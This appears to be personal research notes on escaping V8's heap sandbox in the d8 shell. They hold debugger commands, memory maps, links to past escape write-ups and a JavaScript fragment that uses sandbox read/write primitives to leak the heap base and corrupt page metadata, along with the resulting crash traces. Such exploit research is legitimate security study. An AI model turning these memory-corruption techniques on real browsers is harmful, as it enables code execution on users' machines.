

## V8 Sandbox

- Setting up commands
```cpp
// r --allow-natives-syntax --sandbox-testing ../../../test.jse
r --allow-natives-syntax --expose-gc --sandbox-testing ../../../test.js

// printing process infomation: pid, cmdline, cwd, exe,...
info proc

// process mapping 
info proc map 

// setting output in heximal type
set output-radix 16
```

- Challenges:
    `Write to the page starting at 0x587b312b000`
- mmap 
```
587b312b000-587b312c000 r--p 00000000 00:00 0 
138f00000000-139700000000 ---p 00000000 00:00 0 
139700000000-139700010000 r--p 00000000 00:00 0 
139700010000-139700020000 ---p 00000000 00:00 0 
139700020000-139700040000 r--p 00000000 00:00 0 
139700040000-139700149000 rw-p 00000000 00:00 0 
139700149000-139700180000 ---p 00000000 00:00 0 
139700180000-13970027e000 r--p 00000000 00:00 0 
13970027e000-139700280000 ---p 00000000 00:00 0 
139700280000-1397002c0000 rw-p 00000000 00:00 0 
1397002c0000-139800000000 ---p 00000000 00:00 0 
139800000000-139800100000 rw-p 00000000 00:00 0 
139800100000-149f00000000 ---p 00000000 00:00 0 
343b00000000-343b00001000 rw-p 00000000 00:00 0 
343b00001000-343b00040000 ---p 00000000 00:00 0 
343b00040000-343b00080000 rw-p 00000000 00:00 0 
343b00080000-343b40000000 ---p 00000000 00:00 0 
555555554000-555555576000 r--p 00000000 08:03 6506518                    /home/vult/Desktop/v8/v8/out/debug/d8
555555576000-5555555c2000 r-xp 00021000 08:03 6506518                    /home/vult/Desktop/v8/v8/out/debug/d8


```

- output:
```
pwndbg> x/20gx 0x1397000493f5-1
0x1397000493f4:	0x414141410028380d	0x0000000000004141
0x139700049404:	0x00000068000493b1	0x0000000000000000
0x139700049414:	0x0000000100000000	0x0000000100000000
0x139700049424:	0x0100000000000000	0x0000000000000000
0x139700049434:	0x0000000000000000	0xbeadbeef00000000
0x139700049444:	0xbeadbeefbeadbeef	0xbeadbeefbeadbeef
0x139700049454:	0xbeadbeefbeadbeef	0xbeadbeefbeadbeef
0x139700049464:	0xbeadbeefbeadbeef	0xbeadbeefbeadbeef
0x139700049474:	0xbeadbeefbeadbeef	0xbeadbeefbeadbeef

```
### Studying Previous Sandbox Escape Techniques
- Blogs:
    1. https://ju256.de/posts/kitctfctf22-date/
    2. https://jhalon.github.io/chrome-browser-exploitation-1/
    3. https://blog.kylebot.net/2022/02/06/DiceCTF-2022-memory-hole/
    4. https://saelo.github.io/presentations/offensivecon_24_the_v8_heap_sandbox.pdf

- V8 virtual memory cage

**Idea 1: Corrupting a Function object to redirect code execution to an arbitrary location**
Example:
```js
const foo = () => {
  return;
}
%DebugPrint(foo);
%SystemBreak();

```
The author manipulates the `code_entry_point` of a function that it's possible to redirect execution to a controlled address. In the newest version, they didn't store `code_entry_point` raw pointer in the v8 memory.  

### Debugging V8 
...

### Mutable Page Metadata

- heap_base
```js
// heap_base
let ofs1 = 0x48;
let leak_addr = v8_read64(ofs1);
let ofs2 = leak_addr & 0xffffffffn;
let ofs3 = leak_addr & 0xffffffff00000000n;
let leak_addr2 = ofs3 + 0x48n;
console.log("addr[0x" + ofs1.toString(16) + "] = 0x" + leak_addr.toString(16));
console.log("ofs2: ", ofs2.toString(16));
console.log("ofs2 value: ", v8_read64(ofs2).toString(16));
console.log("before writing to addr: 0x"+ leak_addr2.toString(16));
// 0x35b200000048

%SystemBreak();

v8_write64(ofs2, 0x4141414142424242n);
%SystemBreak();
```
**what is heap metadata ptmalloc on v8?**
```
#
# Fatal error in ../../src/heap/mutable-page-inl.h, line 57
# Debug check failed: owner() == nullptr == Chunk()->InReadOnlySpace() (0 vs. 1).
#
// Stacktrace

#0  0x00007ffff4028016 in v8::base::OS::Abort() () at ../../src/base/platform/platform-posix.cc:699
#1  0x00007ffff400b8cb in V8_Fatal(char const*, int, char const*, ...) () at ../../src/base/logging.cc:205
#2  0x00007ffff400b305 in v8::base::(anonymous namespace)::DefaultDcheckHandler(char const*, int, char const*) () at ../../src/base/logging.cc:57
#3  0x00007ffff5bffedd in v8::internal::MainAllocator::Verify() const () at ../../src/heap/mutable-page-inl.h:57
#4  0x00007ffff5c00ead in v8::internal::MainAllocator::FreeLinearAllocationArea() () at ../../src/heap/main-allocator.cc:338
#5  0x00007ffff5b9988e in v8::internal::HeapAllocator::FreeLinearAllocationAreas() () at ../../src/heap/heap-allocator.cc:236
#6  0x00007ffff5bd1b64 in v8::internal::Heap::StartTearDown() () at ../../src/heap/heap.cc:6106
#7  0x00007ffff5a1963c in v8::internal::Isolate::Deinit() () at ../../src/execution/isolate.cc:4151
#8  0x00007ffff5a191b3 in v8::internal::Isolate::Delete(v8::internal::Isolate*) () at ../../src/execution/isolate.cc:3833
#9  0x000055555559e4c9 in v8::Shell::OnExit(v8::Isolate*, bool) () at ../../src/d8/d8.cc:3901
#10 0x00005555555ab4bd in v8::Shell::Main(int, char**) () at ../../src/d8/d8.cc:6233
#11 0x00007ffff3833083 in __libc_start_main (main=0x5555555ab830 <main>, argc=4, argv=0x7fffffffe308, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7fffffffe2f8) at ../csu/libc-start.c:308
#12 0x0000555555576c9a in _start ()
```

`String::Flatten`???

```cpp
before writing to addr: 0x345200040000

pwndbg> p s
$10 = {
  <v8::internal::Tagged<v8::internal::HeapObject>> = {
    <v8::internal::TaggedImpl<1, unsigned long>> = {
      static kIsFull = 0x1,
      static kCanBeWeak = 0x0,
      ptr_ = 0x345200049ccd
    }, <No data fields>}, <No data fields>}
```

**When using gc()**
Stacktrace:
```cpp
#0  0x00007fffeda6f189 in v8::base::OS::Abort()::$_0::operator()() const (this=0x7fffffffd1af) at ../../src/base/platform/platform-posix.cc:699
#1  0x00007fffeda6f173 in v8::base::OS::Abort () at ../../src/base/platform/platform-posix.cc:699
#2  0x00007fffeda453d1 in V8_Fatal (file=0x7ffff1e6a339 "../../src/heap/memory-allocator.h", line=0x3b, format=0x7fffeda18f73 "Debug check failed: %s.") at ../../src/base/logging.cc:205
#3  0x00007fffeda44d9c in v8::base::(anonymous namespace)::DefaultDcheckHandler (file=0x7ffff1e6a339 "../../src/heap/memory-allocator.h", line=0x3b, message=0x7ffff1f2e467 "!chunk->Chunk()->IsLargePage()") at ../../src/base/logging.cc:57
#4  0x00007fffeda4548e in V8_Dcheck (file=0x7ffff1e6a339 "../../src/heap/memory-allocator.h", line=0x3b, message=0x7ffff1f2e467 "!chunk->Chunk()->IsLargePage()") at ../../src/base/logging.cc:217
#5  0x00007ffff462dfa8 in v8::internal::MemoryAllocator::Pool::Add (this=0x5555556fdaf8, chunk=0x5555557670f0) at ../../src/heap/memory-allocator.h:59
#6  0x00007ffff462c15b in v8::internal::MemoryAllocator::Free (this=0x5555556fda80, mode=v8::internal::MemoryAllocator::FreeMode::kPool, chunk_metadata=0x5555557670f0) at ../../src/heap/memory-allocator.cc:396
#7  0x00007ffff464f906 in v8::internal::SemiSpace::Uncommit (this=0x5555556f5660) at ../../src/heap/new-spaces.cc:163
#8  0x00007ffff464f808 in v8::internal::SemiSpace::TearDown (this=0x5555556f5660) at ../../src/heap/new-spaces.cc:119
#9  0x00007ffff4651af0 in v8::internal::SemiSpaceNewSpace::~SemiSpaceNewSpace (this=0x5555556f5550) at ../../src/heap/new-spaces.cc:490
#10 0x00007ffff4651b59 in v8::internal::SemiSpaceNewSpace::~SemiSpaceNewSpace (this=0x5555556f5550) at ../../src/heap/new-spaces.cc:488
#11 0x00007ffff455f6e8 in std::__Cr::default_delete<v8::internal::Space>::operator() (this=0x555555716258, __ptr=0x5555556f5550) at ../../third_party/libc++/src/include/__memory/unique_ptr.h:67
#12 0x00007ffff45362e6 in std::__Cr::unique_ptr<v8::internal::Space, std::__Cr::default_delete<v8::internal::Space> >::reset (this=0x555555716258, __p=0x0) at ../../third_party/libc++/src/include/__memory/unique_ptr.h:278
#13 0x00007ffff4514a60 in v8::internal::Heap::TearDown (this=0x5555557160f8) at ../../src/heap/heap.cc:6212
#14 0x00007ffff42a3e33 in v8::internal::Isolate::Deinit (this=0x555555708000) at ../../src/execution/isolate.cc:4215
#15 0x00007ffff42a381f in v8::internal::Isolate::Delete (isolate=0x555555708000) at ../../src/execution/isolate.cc:3833
#16 0x00007ffff3d272e5 in v8::Isolate::Dispose (this=0x555555708000) at ../../src/api/api.cc:9816
#17 0x000055555567edfd in v8::Shell::OnExit (isolate=0x555555708000, dispose=0x1) at ../../src/d8/d8.cc:3901
#18 0x000055555568c92b in v8::Shell::Main (argc=0x5, argv=0x7fffffffe2e8) at ../../src/d8/d8.cc:6233
#19 0x000055555568cd52 in main (argc=0x5, argv=0x7fffffffe2e8) at ../../src/d8/d8.cc:6256
#20 0x00007fffed1eb083 in __libc_start_main (main=0x55555568cd30 <main(int, char**)>, argc=0x5, argv=0x7fffffffe2e8, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7fffffffe2d8) at ../csu/libc-start.c:308
#21 0x00005555556388da in _start ()
```

```cpp
0x234900040000
// normal page 
pwndbg> x/40wx 0x00001e4800340000
0x1e4800340000:	0x00000012	0x00000000	0x0000000d	0xbeadbeef
0x1e4800340010:	0x00000971	0x0007ffe0	0xbeadbeef	0xbeadbeef
0x1e4800340020:	0xbeadbeef	0xbeadbeef	0xbeadbeef	0xbeadbeef

// corrupted page
pwndbg> x/40wx 0x00001e4800040000
0x1e4800040000:	0x42424242	0x41414141	0x00000001	0xbeadbeef
0x1e4800040010:	0x42424242	0x41414141	0xbeadbeef	0xbeadbeef
0x1e4800040020:	0x42424242	0x41414141	0xbeadbeef	0xbeadbeef

pwndbg> p chunk_metadata
$10 = (v8::internal::MutablePageMetadata *) 0x5555557670f0
pwndbg> x/40gx 0x5555557670f0
0x5555557670f0:	0x00005555556fe140	0x00001e4800040000
0x555555767100:	0x0000000000040000	0x000000000003fff0 // +0x10 -> size_
0x555555767110:	0x0000000000000000	0x0000000000009cc8

/// proc mapping
seacloud at ~/Desktop/v8/v8 ❯ cat /proc/3901929/maps | head -n 50
1913b1539000-1913b153a000 r--p 00000000 00:00 0 
1e4000000000-1e4800000000 ---p 00000000 00:00 0 
1e4800000000-1e4800010000 r--p 00000000 00:00 0 
1e4800010000-1e4800020000 ---p 00000000 00:00 0 
1e4800020000-1e4800040000 r--p 00000000 00:00 0 
1e4800040000-1e4800149000 rw-p 00000000 00:00 0 
1e4800149000-1e4800180000 ---p 00000000 00:00 0 
1e4800180000-1e480027e000 r--p 00000000 00:00 0 
1e480027e000-1e4800280000 ---p 00000000 00:00 0 
1e4800280000-1e48003c0000 rw-p 00000000 00:00 0 
1e48003c0000-1e4900000000 ---p 00000000 00:00 0 
1e4900000000-1e4900100000 ---p 00000000 00:00 0 
1e4900100000-1f5000000000 ---p 00000000 00:00 0 
3b3700000000-3b3700001000 rw-p 00000000 00:00 0 
3b3700001000-3b3700040000 ---p 00000000 00:00 0 
3b3700040000-3b3700080000 rw-p 00000000 00:00 0 
3b3700080000-3b3740000000 ---p 00000000 00:00 0 
555555554000-555555638000 r--p 00000000 08:03 8704715                    /home/vult/Desktop/v8/v8/out/debug/d8
555555638000-5555556e7000 r-xp 000e3000 08:03 8704715                    /home/vult/Desktop/v8/v8/out/debug/d8
5555556e7000-5555556e9000 r--p 00191000 08:03 8704715                    /home/vult/Desktop/v8/v8/out/debug/d8
5555556e9000-5555556eb000 rw-p 00192000 08:03 8704715                    /home/vult/Desktop/v8/v8/out/debug/d8
5555556eb000-5555557e7000 rw-p 00000000 00:00 0                          [heap]


```